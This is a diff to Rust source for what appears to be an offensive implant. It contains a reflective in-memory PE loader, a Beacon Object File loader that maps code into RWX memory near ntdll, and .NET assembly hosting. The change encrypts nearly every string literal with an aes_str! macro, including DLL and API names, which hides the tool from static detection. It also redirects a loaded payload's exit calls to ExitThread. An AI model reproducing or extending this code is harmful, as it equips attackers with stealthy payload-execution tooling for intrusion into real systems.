@@ -12,6 +12,8 @@
 // 1. PE LOADER (Windows only)
 // ────────────────────────────────────────────────────────────────────────
 
+use crate::strcrypt_rt;
+use strcrypt::aes_str;
 #[cfg(target_os = "windows")]
 pub mod pe_loader {
     use super::*;
@@ -97,14 +99,10 @@ pub mod pe_loader {
         fn GetCurrentProcess() -> *mut c_void;
     }
 
-    const MEM_COMMIT: u32 = 0x1000;
-    const MEM_RESERVE: u32 = 0x2000;
-    const MEM_RELEASE: u32 = 0x8000;
-    const PAGE_READWRITE: u32 = 0x04;
-    const PAGE_EXECUTE_READ: u32 = 0x20;
-    const PAGE_EXECUTE_READWRITE: u32 = 0x40;
-    const IMAGE_DIRECTORY_ENTRY_BASERELOC: usize = 5;
-    const IMAGE_DIRECTORY_ENTRY_IMPORT: usize = 1;
+    // MEM_* / PAGE_* / IMAGE_NT_SIGNATURE / IMAGE_DIRECTORY_ENTRY_IMPORT are
+    // read from config().ffi_windows at runtime (values mirror winnt.h).
+    // PE-format values with no typed-config mirror stay const - OS-fixed.
+    const IMAGE_DIRECTORY_ENTRY_BASERELOC: usize = 5; // OS-fixed (PE/COFF spec)
 
     /// Returns `true` when `[offset, offset + len)` lies fully inside `limit`.
     ///
@@ -139,25 +137,30 @@ pub mod pe_loader {
     ///
     /// Returns Ok(base_address) on success.
     pub unsafe fn load_pe(pe_bytes: &[u8]) -> Result<String, String> {
+        // Win32 allocation/protection flags and PE constants mirrored by the
+        // typed FFI config (defaults match winnt.h). Fetched once per call.
+        let ffi = &crate::config::config().ffi_windows;
+        let dir_entry_import = ffi.image_directory_entry_import as usize;
+
         if pe_bytes.len() < mem::size_of::<ImageDosHeader>() {
-            return Err("PE too small".into());
+            return Err(aes_str!("PE too small"));
         }
 
         let dos = &*(pe_bytes.as_ptr() as *const ImageDosHeader);
-        if dos.e_magic != 0x5A4D { return Err("Invalid DOS signature".into()); }
+        if dos.e_magic != 0x5A4D { return Err(aes_str!("Invalid DOS signature")); }
 
         // e_lfanew is a signed i32: a negative value sign-extends to a huge
         // usize, the old `nt_offset + size > len` check wrapped around, and the
         // NT-header deref went out of bounds. Reject negatives outright and do
         // the end-of-header computation with checked arithmetic.
-        if dos.e_lfanew < 0 { return Err("Invalid NT header offset (negative e_lfanew)".into()); }
+        if dos.e_lfanew < 0 { return Err(aes_str!("Invalid NT header offset (negative e_lfanew)")); }
         let nt_offset = dos.e_lfanew as usize;
         if !range_ok(nt_offset, mem::size_of::<ImageNtHeaders64>(), pe_bytes.len()) {
-            return Err("Invalid NT header offset".into());
+            return Err(aes_str!("Invalid NT header offset"));
         }
         let nt = &*(pe_bytes.as_ptr().add(nt_offset) as *const ImageNtHeaders64);
-        if nt.signature != 0x00004550 { return Err("Invalid PE signature".into()); }
-        if nt.optional_header.magic != 0x20B { return Err("Only PE32+ (x64) supported".into()); }
+        if nt.signature != ffi.image_nt_signature { return Err(aes_str!("Invalid PE signature")); }
+        if nt.optional_header.magic != 0x20B { return Err(aes_str!("Only PE32+ (x64) supported")); }
 
         let image_size = nt.optional_header.size_of_image as usize;
         let header_size = nt.optional_header.size_of_headers as usize;
@@ -167,7 +170,7 @@ pub mod pe_loader {
         // SizeOfImage is malformed - the header copy would otherwise write past
         // the VirtualAlloc'd region.
         if image_size == 0 || header_size > image_size {
-            return Err("Invalid SizeOfImage/SizeOfHeaders".into());
+            return Err(aes_str!("Invalid SizeOfImage/SizeOfHeaders"));
         }
 
         // Section headers live right after the optional header. Validate the
@@ -177,25 +180,25 @@ pub mod pe_loader {
         let section_count = nt.file_header.number_of_sections as usize;
         let sections_offset = nt_offset
             .checked_add(4 + mem::size_of::<ImageFileHeader>() + nt.file_header.size_of_optional_header as usize)
-            .ok_or_else(|| "Invalid section table offset".to_string())?;
+            .ok_or_else(|| aes_str!("Invalid section table offset"))?;
         // number_of_sections is a u16, so the multiply cannot overflow usize.
         if !range_ok(sections_offset, section_count * mem::size_of::<ImageSectionHeader>(), pe_bytes.len()) {
-            return Err("Section table outside of PE buffer".into());
+            return Err(aes_str!("Section table outside of PE buffer"));
         }
 
         // 1. Allocate memory for the image
         let base = VirtualAlloc(
             preferred_base as *mut c_void,
             image_size,
-            MEM_COMMIT | MEM_RESERVE,
-            PAGE_READWRITE,
+            ffi.mem_commit | ffi.mem_reserve,
+            ffi.page_readwrite,
         );
         let base = if base.is_null() {
             // Preferred base unavailable; let OS choose
-            VirtualAlloc(ptr::null_mut(), image_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)
+            VirtualAlloc(ptr::null_mut(), image_size, ffi.mem_commit | ffi.mem_reserve, ffi.page_readwrite)
         } else { base };
 
-        if base.is_null() { return Err("VirtualAlloc failed".into()); }
+        if base.is_null() { return Err(aes_str!("VirtualAlloc failed")); }
 
         // 2. Copy headers - capped by BOTH the file size and the allocated
         // image size (SizeOfHeaders > SizeOfImage is rejected above; the clamp
@@ -255,8 +258,8 @@ pub mod pe_loader {
 
                         // Block header (8 bytes) must be readable from the image.
                         if !range_ok(block_rva, mem::size_of::<ImageBaseRelocation>(), image_size) {
-                            VirtualFree(base, 0, MEM_RELEASE);
-                            return Err("Relocation block outside mapped image".into());
+                            VirtualFree(base, 0, ffi.mem_release);
+                            return Err(aes_str!("Relocation block outside mapped image"));
                         }
                         let block = &*((base as *const u8).add(block_rva) as *const ImageBaseRelocation);
                         if block.size_of_block == 0 { break; }
@@ -266,8 +269,8 @@ pub mod pe_loader {
                         // into a huge entry count (OOB read/write). The whole
                         // block must also fit inside the mapped image.
                         if block_size < 8 || !range_ok(block_rva, block_size, image_size) {
-                            VirtualFree(base, 0, MEM_RELEASE);
-                            return Err("Malformed relocation block size".into());
+                            VirtualFree(base, 0, ffi.mem_release);
+                            return Err(aes_str!("Malformed relocation block size"));
                         }
 
                         let entry_count = (block_size - 8) / 2;
@@ -286,8 +289,8 @@ pub mod pe_loader {
                                 // The patched u64 must lie fully within the image;
                                 // the old code wrote through this pointer unchecked.
                                 if !range_ok(patch_rva, 8, image_size) {
-                                    VirtualFree(base, 0, MEM_RELEASE);
-                                    return Err("Relocation target outside mapped image".into());
+                                    VirtualFree(base, 0, ffi.mem_release);
+                                    return Err(aes_str!("Relocation target outside mapped image"));
                                 }
                                 let patch_addr = (base as *mut u8).add(patch_rva) as *mut u64;
                                 *patch_addr = (*patch_addr as i64 + delta) as u64;
@@ -301,9 +304,9 @@ pub mod pe_loader {
         }
 
         // 5. Resolve imports
-        if nt.optional_header.number_of_rva_and_sizes > IMAGE_DIRECTORY_ENTRY_IMPORT as u32 {
+        if nt.optional_header.number_of_rva_and_sizes > dir_entry_import as u32 {
             let data_dir_offset = nt_offset + 4 + mem::size_of::<ImageFileHeader>() + 112;
-            let import_entry_offset = data_dir_offset + IMAGE_DIRECTORY_ENTRY_IMPORT * 8;
+            let import_entry_offset = data_dir_offset + dir_entry_import * 8;
             // Bounds check: verify the import data directory entry is within the PE buffer.
             if range_ok(import_entry_offset, 8, pe_bytes.len()) {
                 let import_dir = &*(pe_bytes.as_ptr().add(import_entry_offset) as *const ImageDataDirectory);
@@ -317,8 +320,8 @@ pub mod pe_loader {
                         // mapped image before it happens.
                         let desc_rva = import_rva + desc_offset;
                         if !range_ok(desc_rva, mem::size_of::<ImageImportDescriptor>(), image_size) {
-                            VirtualFree(base, 0, MEM_RELEASE);
-                            return Err("Import descriptor outside mapped image".into());
+                            VirtualFree(base, 0, ffi.mem_release);
+                            return Err(aes_str!("Import descriptor outside mapped image"));
                         }
                         let desc = &*((base as *const u8).add(desc_rva) as *const ImageImportDescriptor);
                         if desc.name == 0 { break; }
@@ -326,14 +329,14 @@ pub mod pe_loader {
                         let dll_name = match cstr_in_image(base as *const u8, image_size, desc.name as usize) {
                             Some(s) => s,
                             None => {
-                                VirtualFree(base, 0, MEM_RELEASE);
-                                return Err("Import DLL name outside mapped image".into());
+                                VirtualFree(base, 0, ffi.mem_release);
+                                return Err(aes_str!("Import DLL name outside mapped image"));
                             }
                         };
                         let h_module = LoadLibraryA(dll_name.as_ptr());
                         if h_module.is_null() {
                             let name_str = dll_name.to_string_lossy();
-                            VirtualFree(base, 0, MEM_RELEASE);
+                            VirtualFree(base, 0, ffi.mem_release);
                             return Err(format!("Failed to load dependency: {}", name_str));
                         }
 
@@ -344,8 +347,8 @@ pub mod pe_loader {
                             // the mapped image (previously unchecked).
                             let olt_entry_rva = olt_rva + thunk_offset;
                             if !range_ok(olt_entry_rva, 8, image_size) {
-                                VirtualFree(base, 0, MEM_RELEASE);
-                                return Err("Import thunk outside mapped image".into());
+                                VirtualFree(base, 0, ffi.mem_release);
+                                return Err(aes_str!("Import thunk outside mapped image"));
                             }
                             let olt_entry = *((base as *const u8).add(olt_entry_rva) as *const u64);
                             if olt_entry == 0 { break; }
@@ -360,15 +363,15 @@ pub mod pe_loader {
                                 let name_rva = match (olt_entry as usize).checked_add(2) {
                                     Some(r) => r,
                                     None => {
-                                        VirtualFree(base, 0, MEM_RELEASE);
-                                        return Err("Import name RVA overflow".into());
+                                        VirtualFree(base, 0, ffi.mem_release);
+                                        return Err(aes_str!("Import name RVA overflow"));
                                     }
                                 };
                                 let func_name = match cstr_in_image(base as *const u8, image_size, name_rva) {
                                     Some(s) => s,
                                     None => {
-                                        VirtualFree(base, 0, MEM_RELEASE);
-                                        return Err("Import name outside mapped image".into());
+                                        VirtualFree(base, 0, ffi.mem_release);
+                                        return Err(aes_str!("Import name outside mapped image"));
                                     }
                                 };
                                 let resolved = GetProcAddress(h_module, func_name.as_ptr());
@@ -384,16 +387,18 @@ pub mod pe_loader {
                                 // the loaded PE's own import table - not calls from within
                                 // the CRT DLL. We must hook the CRT functions themselves.
                                 let fname_bytes = func_name.to_bytes();
-                                let is_exit_func = fname_bytes == b"ExitProcess"
-                                    || fname_bytes == b"exit"
-                                    || fname_bytes == b"_exit"
-                                    || fname_bytes == b"_cexit"
-                                    || fname_bytes == b"_c_exit"
-                                    || fname_bytes == b"abort";
+                                let is_exit_func = fname_bytes == aes_str!("ExitProcess").as_bytes()
+                                    || fname_bytes == aes_str!("exit").as_bytes()
+                                    || fname_bytes == aes_str!("_exit").as_bytes()
+                                    || fname_bytes == aes_str!("_cexit").as_bytes()
+                                    || fname_bytes == aes_str!("_c_exit").as_bytes()
+                                    || fname_bytes == aes_str!("abort").as_bytes();
 
                                 if is_exit_func {
-                                    let k32 = LoadLibraryA(b"kernel32.dll\0".as_ptr() as *const i8);
-                                    let exit_thread = GetProcAddress(k32, b"ExitThread\0".as_ptr() as *const i8);
+                                    let k32_name = std::ffi::CString::new(aes_str!("kernel32.dll")).unwrap();
+                                    let et_name = std::ffi::CString::new(aes_str!("ExitThread")).unwrap();
+                                    let k32 = LoadLibraryA(k32_name.as_ptr());
+                                    let exit_thread = GetProcAddress(k32, et_name.as_ptr());
                                     if !exit_thread.is_null() { exit_thread } else { resolved }
                                 } else {
                                     resolved
@@ -410,13 +415,13 @@ pub mod pe_loader {
                                     match (olt_entry as usize).checked_add(2) {
                                         Some(r) => match cstr_in_image(base as *const u8, image_size, r) {
                                             Some(s) => s.to_string_lossy().into_owned(),
-                                            None => "<invalid name RVA>".to_string(),
+                                            None => aes_str!("<invalid name RVA>"),
                                         },
-                                        None => "<invalid name RVA>".to_string(),
+                                        None => aes_str!("<invalid name RVA>"),
                                     }
                                 };
                                 let dll_str = dll_name.to_string_lossy();
-                                VirtualFree(base, 0, MEM_RELEASE);
+                                VirtualFree(base, 0, ffi.mem_release);
                                 return Err(format!("Import resolution failed: {}!{}", dll_str, name_info));
                             }
 
@@ -424,8 +429,8 @@ pub mod pe_loader {
                             // against image_size first (previously unchecked).
                             let iat_rva = desc.first_thunk as usize + thunk_offset;
                             if !range_ok(iat_rva, 8, image_size) {
-                                VirtualFree(base, 0, MEM_RELEASE);
-                                return Err("IAT entry outside mapped image".into());
+                                VirtualFree(base, 0, ffi.mem_release);
+                                return Err(aes_str!("IAT entry outside mapped image"));
                             }
                             let iat_slot = (base as *mut u8).add(iat_rva) as *mut u64;
                             *iat_slot = func_addr as u64;
@@ -455,10 +460,10 @@ pub mod pe_loader {
             let is_write = sec.characteristics & 0x80000000 != 0; // IMAGE_SCN_MEM_WRITE
 
             let protect = match (is_exec, is_write) {
-                (true, true) => PAGE_EXECUTE_READWRITE,
-                (true, false) => PAGE_EXECUTE_READ,
-                (false, true) => PAGE_READWRITE,
-                (false, false) => 0x02, // PAGE_READONLY
+                (true, true) => ffi.page_execute_readwrite,
+                (true, false) => ffi.page_execute_read,
+                (false, true) => ffi.page_readwrite,
+                (false, false) => 0x02, // PAGE_READONLY - OS-fixed, not mirrored
             };
 
             let mut old = 0u32;
@@ -480,8 +485,8 @@ pub mod pe_loader {
         // A hostile AddressOfEntryPoint would otherwise make us call memory
         // outside the mapped image.
         if entry_rva >= image_size {
-            VirtualFree(base, 0, MEM_RELEASE);
-            return Err("Entry point outside mapped image".into());
+            VirtualFree(base, 0, ffi.mem_release);
+            return Err(aes_str!("Entry point outside mapped image"));
         }
 
         let is_dll = nt.file_header.characteristics & 0x2000 != 0; // IMAGE_FILE_DLL
@@ -518,9 +523,9 @@ pub mod pe_loader {
                 extern "system" {
                     fn VirtualFree(addr: *mut c_void, size: usize, free_type: u32) -> i32;
                 }
-                const MEM_RELEASE: u32 = 0x8000;
                 unsafe {
-                    VirtualFree(base_copy as *mut c_void, 0, MEM_RELEASE);
+                    VirtualFree(base_copy as *mut c_void, 0,
+                        crate::config::config().ffi_windows.mem_release);
                 }
             });
 
@@ -532,8 +537,10 @@ pub mod pe_loader {
 // Stub for non-Windows
 #[cfg(not(target_os = "windows"))]
 pub mod pe_loader {
+    use super::{aes_str, strcrypt_rt};
+
     pub unsafe fn load_pe(_pe_bytes: &[u8]) -> Result<String, String> {
-        Err("PE loading is Windows-only".into())
+        Err(aes_str!("PE loading is Windows-only"))
     }
 }
 
@@ -548,6 +555,7 @@ pub mod bof {
     use std::mem;
     use std::collections::{HashMap, HashSet};
     use std::sync::{Mutex, OnceLock};
+    use super::{aes_str, strcrypt_rt};
 
     extern "system" {
         fn VirtualAlloc(addr: *mut c_void, size: usize, alloc_type: u32, protect: u32) -> *mut c_void;
@@ -569,6 +577,8 @@ pub mod bof {
     #[repr(C)]
     struct EXCEPTION_POINTERS { exception_record: *mut EXCEPTION_RECORD, _context: *mut c_void }
 
+    // NTSTATUS exception codes - OS-fixed (winnt.h), not mirrored by the
+    // typed FFI config, so they stay const.
     const EXCEPTION_ACCESS_VIOLATION: u32 = 0xC0000005;
     const EXCEPTION_INT_DIVIDE_BY_ZERO: u32 = 0xC0000094;
     const EXCEPTION_STACK_OVERFLOW: u32 = 0xC00000FD;
@@ -621,10 +631,9 @@ pub mod bof {
         EXCEPTION_CONTINUE_SEARCH
     }
 
-    const MEM_COMMIT: u32 = 0x1000;
-    const MEM_RESERVE: u32 = 0x2000;
-    const MEM_RELEASE: u32 = 0x8000;
-    const PAGE_EXECUTE_READWRITE: u32 = 0x40;
+    // MEM_* / PAGE_* are read from config().ffi_windows at runtime (values
+    // mirror winnt.h). COFF relocation tags live in crate::config_consts
+    // because they are used as match patterns.
 
     // Minimal COFF header structures
     #[repr(C, packed)]
@@ -673,10 +682,6 @@ pub mod bof {
         number_of_aux_symbols: u8,
     }
 
-    const IMAGE_REL_AMD64_ADDR64: u16 = 1;
-    const IMAGE_REL_AMD64_ADDR32NB: u16 = 3;
-    const IMAGE_REL_AMD64_REL32: u16 = 4;
-
     /// Load and execute a BOF (COFF object file).
     ///
     /// The BOF must export a function named `go` with signature:
@@ -684,12 +689,16 @@ pub mod bof {
     ///
     /// `args_data` is passed verbatim to the `go` function.
     pub unsafe fn run_bof(coff_bytes: &[u8], args_data: &[u8]) -> Result<String, String> {
+        // Win32 allocation/protection flags from the typed FFI config
+        // (defaults match winnt.h). Fetched once per call.
+        let ffi = &crate::config::config().ffi_windows;
+
         if coff_bytes.len() < mem::size_of::<CoffHeader>() {
-            return Err("COFF too small".into());
+            return Err(aes_str!("COFF too small"));
         }
 
         let header = *(coff_bytes.as_ptr() as *const CoffHeader);
-        if header.machine != 0x8664 { return Err("Only x64 COFF supported".into()); }
+        if header.machine != 0x8664 { return Err(aes_str!("Only x64 COFF supported")); }
 
         let num_sections = header.number_of_sections as usize;
         let sections_offset = mem::size_of::<CoffHeader>() + header.size_of_optional_header as usize;
@@ -703,9 +712,9 @@ pub mod bof {
         // Section table: [sections_offset, sections_offset + num_sections * 40)
         let sec_table_bytes = num_sections
             .checked_mul(mem::size_of::<CoffSection>())
-            .ok_or_else(|| "COFF section table size overflow".to_string())?;
+            .ok_or_else(|| aes_str!("COFF section table size overflow"))?;
         if sections_offset.checked_add(sec_table_bytes).map_or(true, |end| end > coff_bytes.len()) {
-            return Err("COFF section table out of bounds".into());
+            return Err(aes_str!("COFF section table out of bounds"));
         }
 
         // Symbol table: [sym_table_offset, string_table_offset), 18 bytes/symbol.
@@ -714,12 +723,12 @@ pub mod bof {
         let num_symbols = header.number_of_symbols as usize;
         let sym_table_bytes = num_symbols
             .checked_mul(18) // 18 bytes per symbol
-            .ok_or_else(|| "COFF symbol table size overflow".to_string())?;
+            .ok_or_else(|| aes_str!("COFF symbol table size overflow"))?;
         let string_table_offset = sym_table_offset
             .checked_add(sym_table_bytes)
-            .ok_or_else(|| "COFF symbol table offset overflow".to_string())?;
+            .ok_or_else(|| aes_str!("COFF symbol table offset overflow"))?;
         if string_table_offset > coff_bytes.len() {
-            return Err("COFF symbol table out of bounds".into());
+            return Err(aes_str!("COFF symbol table out of bounds"));
         }
 
         // Per-section relocation tables (reads validated once, up front).
@@ -729,12 +738,12 @@ pub mod bof {
             if num_relocs == 0 { continue; }
             let reloc_bytes = num_relocs
                 .checked_mul(mem::size_of::<CoffReloc>())
-                .ok_or_else(|| "COFF relocation table size overflow".to_string())?;
+                .ok_or_else(|| aes_str!("COFF relocation table size overflow"))?;
             let reloc_end = (sec.pointer_to_relocations as usize)
                 .checked_add(reloc_bytes)
-                .ok_or_else(|| "COFF relocation table offset overflow".to_string())?;
+                .ok_or_else(|| aes_str!("COFF relocation table offset overflow"))?;
             if reloc_end > coff_bytes.len() {
-                return Err("COFF relocation table out of bounds".into());
+                return Err(aes_str!("COFF relocation table out of bounds"));
             }
         }
 
@@ -768,13 +777,14 @@ pub mod bof {
         // Try to allocate near ntdll (where most BOF imports live) to keep
         // REL32 relocations within ±2GB and minimize expensive trampoline usage.
         // If the preferred allocation fails, fall back to any address.
-        let ntdll_base = GetModuleHandleA(b"ntdll.dll\0".as_ptr() as *const i8);
+        let ntdll_name = std::ffi::CString::new(aes_str!("ntdll.dll")).unwrap();
+        let ntdll_base = GetModuleHandleA(ntdll_name.as_ptr());
         let mut base = ptr::null_mut();
         if !ntdll_base.is_null() {
             // Scan downward from ntdll in 64KB increments (VirtualAlloc alignment)
             for offset in (1..=512).map(|i| i * 0x10000usize) {
                 let try_addr = (ntdll_base as usize).saturating_sub(offset) as *mut c_void;
-                let result = VirtualAlloc(try_addr, alloc_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+                let result = VirtualAlloc(try_addr, alloc_size, ffi.mem_commit | ffi.mem_reserve, ffi.page_execute_readwrite);
                 if !result.is_null() {
                     base = result;
                     break;
@@ -783,9 +793,9 @@ pub mod bof {
         }
         // Fallback: let the OS pick any address
         if base.is_null() {
-            base = VirtualAlloc(ptr::null_mut(), alloc_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+            base = VirtualAlloc(ptr::null_mut(), alloc_size, ffi.mem_commit | ffi.mem_reserve, ffi.page_execute_readwrite);
         }
-        if base.is_null() { return Err("VirtualAlloc failed for BOF".into()); }
+        if base.is_null() { return Err(aes_str!("VirtualAlloc failed for BOF")); }
         let mut trampoline_offset = total_size; // first trampoline starts right after sections
 
         let mut section_data: Vec<(*mut u8, usize)> = Vec::new();
@@ -810,8 +820,8 @@ pub mod bof {
                 } else {
                     // Malformed section raw-data pointer: fail closed instead
                     // of silently running a half-mapped BOF.
-                    VirtualFree(base, 0, MEM_RELEASE);
-                    return Err("COFF section raw data out of bounds".into());
+                    VirtualFree(base, 0, ffi.mem_release);
+                    return Err(aes_str!("COFF section raw data out of bounds"));
                 }
             }
 
@@ -847,8 +857,8 @@ pub mod bof {
             let name = match get_symbol_name(&sym) {
                 Some(n) => n,
                 None => {
-                    VirtualFree(base, 0, MEM_RELEASE);
-                    return Err("COFF string table out of bounds".into());
+                    VirtualFree(base, 0, ffi.mem_release);
+                    return Err(aes_str!("COFF string table out of bounds"));
                 }
             };
 
@@ -864,7 +874,7 @@ pub mod bof {
                 resolved.unwrap_or(0)
             } else { 0 };
 
-            if name == "go" || name == "_go" {
+            if name == aes_str!("go") || name == aes_str!("_go") {
                 go_addr = Some(addr as *const u8);
             }
 
@@ -898,12 +908,13 @@ pub mod bof {
                 // Validate it against THIS section's allocated footprint first.
                 let patch_rva = reloc.virtual_address as usize;
                 let patch_size = match reloc.reloc_type {
-                    IMAGE_REL_AMD64_ADDR64 => 8usize,
-                    IMAGE_REL_AMD64_ADDR32NB | IMAGE_REL_AMD64_REL32 => 4usize,
+                    crate::config_consts::IMAGE_REL_AMD64_ADDR64 => 8usize,
+                    crate::config_consts::IMAGE_REL_AMD64_ADDR32NB
+                        | crate::config_consts::IMAGE_REL_AMD64_REL32 => 4usize,
                     _ => continue, // Skip unsupported relocation types
                 };
                 if patch_rva.checked_add(patch_size).map_or(true, |end| end > sec_footprint) {
-                    VirtualFree(base, 0, MEM_RELEASE);
+                    VirtualFree(base, 0, ffi.mem_release);
                     // NB: use the local `patch_rva` copy - referencing the packed
                     // field `reloc.virtual_address` directly (as format! does)
                     // is E0793 undefined behavior.
@@ -915,14 +926,14 @@ pub mod bof {
                 let patch_site = sec_base.add(patch_rva);
 
                 match reloc.reloc_type {
-                    IMAGE_REL_AMD64_ADDR64 => {
+                    crate::config_consts::IMAGE_REL_AMD64_ADDR64 => {
                         *(patch_site as *mut u64) = sym_addr;
                     }
-                    IMAGE_REL_AMD64_ADDR32NB => {
+                    crate::config_consts::IMAGE_REL_AMD64_ADDR32NB => {
                         let rva = (sym_addr as i64 - base as i64) as i32;
                         *(patch_site as *mut i32) = rva;
                     }
-                    IMAGE_REL_AMD64_REL32 => {
+                    crate::config_consts::IMAGE_REL_AMD64_REL32 => {
                         let distance = sym_addr as i64 - (patch_site as i64 + 4);
                         if distance >= i32::MIN as i64 && distance <= i32::MAX as i64 {
                             // Distance fits in i32 - direct relative patch
@@ -944,7 +955,7 @@ pub mod bof {
                                 *(patch_site as *mut i32) = tramp_dist as i32;
                                 trampoline_offset += TRAMPOLINE_SIZE;
                             } else {
-                                VirtualFree(base, 0, MEM_RELEASE);
+                                VirtualFree(base, 0, ffi.mem_release);
                                 return Err(format!(
                                     "BOF relocation failed: trampoline table exhausted ({} used). \
                                      Target 0x{:X} is >2GB from BOF at 0x{:X}.",
@@ -964,8 +975,8 @@ pub mod bof {
         let go = match go_addr {
             Some(addr) if !addr.is_null() => addr,
             _ => {
-                VirtualFree(base, 0, MEM_RELEASE);
-                return Err("Symbol 'go' not found in BOF".into());
+                VirtualFree(base, 0, ffi.mem_release);
+                return Err(aes_str!("Symbol 'go' not found in BOF"));
             }
         };
 
@@ -1012,16 +1023,16 @@ pub mod bof {
 
                 match result {
                     Ok(_) => Ok(()),
-                    Err(_) => Err("BOF panicked during execution".to_string()),
+                    Err(_) => Err(aes_str!("BOF panicked during execution")),
                 }
             }
         });
 
         // thread::join returns Err if the thread panicked OR was killed (VEH ExitThread)
         let bof_result = match handle.join() {
-            Ok(Ok(_)) => Ok("BOF executed successfully".into()),
+            Ok(Ok(_)) => Ok(aes_str!("BOF executed successfully")),
             Ok(Err(e)) => Err(e),
-            Err(_) => Err("BOF crashed (hardware exception caught by VEH, thread terminated)".into()),
+            Err(_) => Err(aes_str!("BOF crashed (hardware exception caught by VEH, thread terminated)")),
         };
 
         // CRITICAL: Do NOT VirtualFree immediately. BOFs commonly spawn async
@@ -1035,7 +1046,7 @@ pub mod bof {
         let base_addr = base as usize; // usize is Send; raw pointers are not
         std::thread::spawn(move || {
             std::thread::sleep(std::time::Duration::from_secs(30));
-            VirtualFree(base_addr as *mut c_void, 0, MEM_RELEASE);
+            VirtualFree(base_addr as *mut c_void, 0, ffi.mem_release);
         });
 
         bof_result
@@ -1043,7 +1054,7 @@ pub mod bof {
 
     /// Resolve BOF import convention: `__imp_KERNEL32$CreateFileA`
     fn resolve_bof_import(name: &str) -> Option<u64> {
-        let stripped = name.strip_prefix("__imp_")?;
+        let stripped = name.strip_prefix(&aes_str!("__imp_"))?;
         let (lib, func) = stripped.split_once('$')?;
         let lib_cstr = std::ffi::CString::new(format!("{}.dll", lib)).ok()?;
         let func_cstr = std::ffi::CString::new(func).ok()?;
@@ -1058,8 +1069,10 @@ pub mod bof {
 
 #[cfg(not(target_os = "windows"))]
 pub mod bof {
+    use super::{aes_str, strcrypt_rt};
+
     pub unsafe fn run_bof(_coff_bytes: &[u8], _args_data: &[u8]) -> Result<String, String> {
-        Err("BOF execution is Windows-only".into())
+        Err(aes_str!("BOF execution is Windows-only"))
     }
 }
 
@@ -1075,6 +1088,7 @@ pub mod dotnet {
     // CLR COM interface GUIDs and vtable offsets.
     // We use ICLRMetaHost -> ICLRRuntimeInfo -> ICLRRuntimeHost to execute
     // a managed assembly via ExecuteInDefaultAppDomain.
+    // GUIDs are OS/COM-fixed (mscoree.h) - not tunables, so they stay const.
 
     #[repr(C)]
     struct GUID { data1: u32, data2: u16, data3: u16, data4: [u8; 8] }
@@ -1197,10 +1211,12 @@ pub mod dotnet {
 
 #[cfg(not(target_os = "windows"))]
 pub mod dotnet {
+    use super::{aes_str, strcrypt_rt};
+
     pub unsafe fn run_assembly(
         _assembly_path: &str, _type_name: &str, _method_name: &str,
         _argument: &str, _runtime_version: &str,
     ) -> Result<String, String> {
-        Err(".NET hosting is Windows-only".into())
+        Err(aes_str!(".NET hosting is Windows-only"))
     }
 }
